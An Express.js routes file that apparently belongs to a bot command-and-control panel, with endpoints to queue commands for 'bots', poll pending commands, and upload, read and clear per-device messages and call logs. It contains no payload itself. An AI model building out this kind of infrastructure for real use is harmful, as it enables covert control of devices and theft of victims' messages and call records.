var ctrls = require('require-dir')('./controllers')
var path = require('path')

module.exports = function Routes(app, io) {

  var bots_ctrl = ctrls.bots_ctrl(io)
  var commands_ctrl = ctrls.commands_ctrl(io)
  var messages_ctrl = ctrls.messages_ctrl(io)
  var call_log_ctrl = ctrls.call_log_ctrl(io)

  app.get('/bots', bots_ctrl.index)
  app.get('/bots/:id', bots_ctrl.show)
  app.get('/status', bots_ctrl.updateStatus)
  app.post('/add-command', commands_ctrl.addCommand)
  app.get('/get-commands', commands_ctrl.getCommands)
  app.get('/pending-commands', commands_ctrl.pendingCommands)
  app.delete('/commands/:id', commands_ctrl.delete)
  app.post('/message', messages_ctrl.addMessage)
  app.delete('/clear-messages/:uid', messages_ctrl.clearMessages)
  app.get('/get-messages/:uid', messages_ctrl.getMessages)
  app.post('/call-logs', call_log_ctrl.create)
  app.get('/call-logs/:uid', call_log_ctrl.showLogs)
  app.delete('/call-logs/:uid', call_log_ctrl.clear)

  app.get(/.*\.(html|js|css|map|jpg|png|gif)/, function(req, res, next) {
    res.status(404).send()
  })
  app.get('*', function(req, res, next) {
    res.sendFile(path.join(__dirname, 'panel', 'index.html'));
  })
}
